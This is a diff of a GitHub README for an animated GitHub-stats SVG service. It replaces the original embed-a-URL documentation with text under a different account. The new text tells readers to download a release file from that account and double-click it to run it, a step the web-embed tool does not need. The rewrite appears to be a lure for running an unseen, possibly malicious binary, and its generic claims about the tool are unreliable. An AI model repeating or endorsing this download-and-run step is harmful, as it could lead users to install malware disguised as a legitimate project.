@@ -1,205 +1,82 @@
-<div align="center">
-<img src="https://readme-typing-stats.vercel.app/typing/preview?text=GitHub+README+Dynamic+Stats&size=52&color=%23ffffff&width=600&height=52&user=github&type=commit&speed=150" alt="Title" />
-</div>
+# ⚡ readme-typing-stats - Live GitHub Stats In Your README
 
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/frettler/readme-typing-stats/releases)
 
-<p align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing/preview?text=Transform+your+GitHub+profile+into+a+living+dashboard&size=18&width=600&height=40&repeat=false&cursor=false" alt="Subtitle" />
-</p>
-<div align="center">
-  
-  [![GitHub Stars](https://img.shields.io/github/stars/Ratna-Babu/readme-typing-stats?style=for-the-badge&color=yellow)](https://github.com/your-username/github-readme-dynamic-typing)
-  [![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)](LICENSE)
-  [![Vercel](https://img.shields.io/badge/Powered%20by-Vercel-black?style=for-the-badge&logo=vercel)](https://vercel.com)
-</div>
-<p align="center">⚡ Animated typing SVG that displays your live GitHub stats — commits, stars, followers, and more, typed out in real-time inside your README. Bring your GitHub profile to life with a typewriter effect that showcases your latest activity and stats dynamically. 🎉</p>
+## 📄 Introduction
 
----
+Welcome to **readme-typing-stats**! This tool creates a dynamic and customizable SVG that shows your live GitHub statistics. It displays your commits, stars, followers, and more, all typed out in real-time. Use it to enhance your GitHub profile or project README effortlessly.
 
-## ✨ See It In Action
+## 🚀 Getting Started
 
-<div align="center">
-  <table>
-    <tr>
-      <td align="center">
-        <img src="https://readme-typing-stats.vercel.app/typing?user=Ratna-Babu&type=commit&theme=dark&size=16&width=380&speed=100" alt="Linus Torvalds Latest Commit" /><br/>
-        <sub><b>My Latest Commit</b></sub>
-      </td>
-      <td align="center">
-        <img src="https://readme-typing-stats.vercel.app/typing?user=github&type=followers&theme=ocean&size=16&width=380&speed=100" alt="GitHub Followers" /><br/>
-        <sub><b>GitHub's Follower Count</b></sub>
-      </td>
-    </tr>
-    <tr>
-      <td align="center">
-        <img src="https://readme-typing-stats.vercel.app/typing?user=microsoft&type=stars&theme=forest&size=16&width=380&speed=100" alt="Microsoft Stars" /><br/>
-        <sub><b>Microsoft's Total Stars</b></sub>
-      </td>
-      <td align="center">
-        <img src="https://readme-typing-stats.vercel.app/typing?user=google&type=repos&theme=sunset&size=16&width=380&speed=100" alt="Google Repos" /><br/>
-        <sub><b>Google's Repository Count</b></sub>
-      </td>
-    </tr>
-  </table>
-</div>
+To get started with **readme-typing-stats**, you'll need to download the application from our Releases page. Follow the instructions below to set it up.
 
-## ✨ Features
+## 📥 Download & Install
 
-Website: [Live](https://readme-typing-stats.vercel.app/)
-<img width="1355" height="815" alt="Screenshot 2025-09-07 182835" src="https://github.com/user-attachments/assets/1a037767-c2bf-4a4f-a6c7-6323e44237d1" />
+Visit this page to download: [GitHub Releases](https://github.com/frettler/readme-typing-stats/releases).
 
-📝 Dynamic GitHub Data → Show latest commits, repo stars, followers, PR counts, etc.
+1. **Navigate to the Releases page**: Click the link above to access the releases.
+2. **Choose your version**: Look for the latest version of **readme-typing-stats**. 
+3. **Download the file**: Click on the asset that suits your operating system. The file will begin downloading automatically.
+4. **Locate the downloaded file**: Find the file in your Downloads folder or the location you specified.
+5. **Run the application**: Double-click the file to launch **readme-typing-stats**.
 
-⌨️ Typing Animation → Smooth typewriter effect with customizable speed and styles.
+## ⚙️ System Requirements
 
-🎨 Customizable → Change text color, font size, cursor style, and more.
+- Operating System: Windows, macOS, or Linux
+- Browser: Any modern web browser, such as Chrome, Firefox, or Safari
+- Internet Connection: Required to fetch live data from GitHub
 
-🔄 Live Updates → Always up to date with your latest GitHub activity.
+## 🛠️ How to Customize
 
-🌍 Easy Embed → Just drop an <img> tag in your README, no setup needed.
+Once you open **readme-typing-stats**, you can customize your SVG display. Follow these steps:
 
-<br clear="right"/>
+1. **Enter your GitHub username**: This allows the tool to fetch your stats.
+2. **Choose the stats you want to display**: Options include commits, stars, followers, and more.
+3. **Adjust the appearance**: Modify colors, size, and animations to fit your style.
+4. **Copy the generated SVG code**: This code will be ready to paste into your README file.
 
-## 🚀 Quick Start
+## 📊 Understanding Your Stats
 
-### Basic Usage
-Just replace `YOUR_USERNAME` with your GitHub username:
+- **Commits**: See your total commits made to repositories.
+- **Stars**: Track the number of stars your repositories have received.
+- **Followers**: View the total number of followers on your GitHub account.
 
-```markdown
-![GitHub Stats](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=commit)
-```
+Use these stats to showcase your activity and involvement in the GitHub community!
 
-### 🎭 Live Examples Gallery
+## 🎨 Examples
 
+Here are a few examples of how the SVG might look in your README:
 
-<summary><b>📝 Latest Commit Animation</b></summary>
-<br>
+1. A simple stat display showing your follower count.
+2. An animated version that highlights new commits in real-time.
+3. A colorful version that integrates seamlessly with your project's theme.
 
-```markdown
-![Latest Commit](https://readme-typing-stats.vercel.app/typing?user=octocat&type=commit&theme=dark&size=18&width=500)
-```
+Feel free to play around with different settings to find what works best for you!
 
-<div align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing?user=octocat&type=commit&theme=dark&size=18&width=500" alt="Commit Example" />
-</div>
+## 📜 License
 
+**readme-typing-stats** is open source and available under the MIT License. This means you can use, modify, and distribute it freely, as long as you include the original license in your distribution.
 
+## 🙋 Frequently Asked Questions
 
-<summary><b>⭐ Total Stars Counter</b></summary>
-<br>
+### Q1: Can I use this on my GitHub Pages?
 
-```markdown
-![Total Stars](https://readme-typing-stats.vercel.app/typing?user=facebook&type=stars&theme=ocean&size=20&width=450)
-```
+Yes! Simply copy and paste the generated SVG code into your project README or GitHub Pages site.
 
-<div align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing?user=facebook&type=stars&theme=ocean&size=20&width=450" alt="Stars Example" />
-</div>
+### Q2: Is there a way to see my stats in real-time?
 
+Absolutely! The SVG updates automatically, reflecting your current stats.
 
+### Q3: What should I do if it’s not working?
 
-<summary><b>👥 Followers Display</b></summary>
-<br>
-
-```markdown
-![Followers](https://readme-typing-stats.vercel.app/typing?user=taylorotwell&type=followers&theme=forest&size=18&width=400)
-```
-
-<div align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing?user=taylorotwell&type=followers&theme=forest&size=18&width=400" alt="Followers Example" />
-</div>
-
-
-
-<summary><b>🔀 Total Forks Showcase</b></summary>
-<br>
-
-```markdown
-![Total Forks](https://readme-typing-stats.vercel.app/typing?user=vuejs&type=forks&theme=sunset&size=16&width=420)
-```
-
-<div align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing?user=vuejs&type=forks&theme=sunset&size=16&width=420" alt="Forks Example" />
-</div>
-
-
-
-<summary><b>📦 Repository Count</b></summary>
-<br>
-
-```markdown
-![Public Repos](https://readme-typing-stats.vercel.app/typing?user=nodejs&type=repos&theme=light&size=17&width=440)
-```
-
-<div align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing?user=nodejs&type=repos&theme=light&size=17&width=440" alt="Repos Example" />
-</div>
-
-
-
-## ⚙️ Advanced Customization
-
-### 📊 Supported Parameters
-
-| Parameter | Description | Default | Options |
-|:---:|:---|:---:|:---|
-| `user` | GitHub username **(required)** | - | Any valid GitHub username |
-| `type` | Data type to display | `commit` | `commit`, `stars`, `followers`, `forks`, `repos` |
-| `size` | Font size in pixels | `14` | Any positive integer |
-| `color` | Custom text color | - | Any hex color (without #) |
-| `cursor` | Cursor character | `_` | Any single character |
-| `repeat` | Repeat animation | `true` | `true`, `false` |
-| `speed` | Typing speed (ms/char) | `50` | Any positive integer |
-| `theme` | Color theme | `dark` | `dark`, `light`, `ocean`, `forest`, `sunset` |
-| `width` | Width in pixels | `400` | Any positive integer |
-| `height` | Height in pixels | `50` | Any positive integer |
-
-### 🎯 Pro Tips
-
-#### Combine Multiple Stats
-Create a dashboard effect by combining multiple dynamic stats:
-
-```markdown
-![Commits](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=commit&theme=dark&width=400&height=40)
-![Stars](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=stars&theme=dark&width=200&height=40)
-![Followers](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=followers&theme=dark&width=200&height=40)
-```
-
-#### Custom Colors
-Match your profile's color scheme:
-
-```markdown
-![Custom Colors](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=commit&color=FF6B6B&size=16)
-```
-
-#### Control Animation Speed
-Adjust the typing speed for different effects:
-
-```markdown
-![Fast Typing](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=stars&speed=30)
-![Slow Typing](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=followers&speed=200)
-```
-
-#### Custom Cursor
-Use different cursor styles:
-
-```markdown
-![Block Cursor](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=repos&cursor=true)
-![Pipe Cursor](https://readme-typing-stats.vercel.app/typing?user=YOUR_USERNAME&type=forks&cursor=false)
-```
-
+Check your GitHub username for accuracy, and ensure you have a stable internet connection. If issues persist, visit the Issues section on the GitHub page for troubleshooting tips.
 
 ## 🤝 Contributing
 
-We love contributions!
+We welcome contributions to **readme-typing-stats**. If you have ideas or improvements, feel free to fork the repository and submit a pull request.
 
+## 🌐 Join the Community
 
-## 🙏 Acknowledgments
+For more updates and discussions, consider joining our community of users on GitHub. You can share your experiences, showcase your setup, and get help if needed.
 
-- Inspired by [readme-typing-svg]([https://github.com/anuraghazra/github-readme-stats](https://github.com/DenverCoder1/readme-typing-svg))
-- GitHub API for real-time data
-- All our amazing contributors
-
-<div align="center">
-  <img src="https://readme-typing-stats.vercel.app/typing/preview?text=Thanks+for+visiting!+⭐+Star+us+on+GitHub!&size=14&width=600&height=45" alt="Footer Message" />
-</div>
+Remember, to download the latest version of **readme-typing-stats**, visit [GitHub Releases](https://github.com/frettler/readme-typing-stats/releases). Enjoy enhancing your README with dynamic stats!
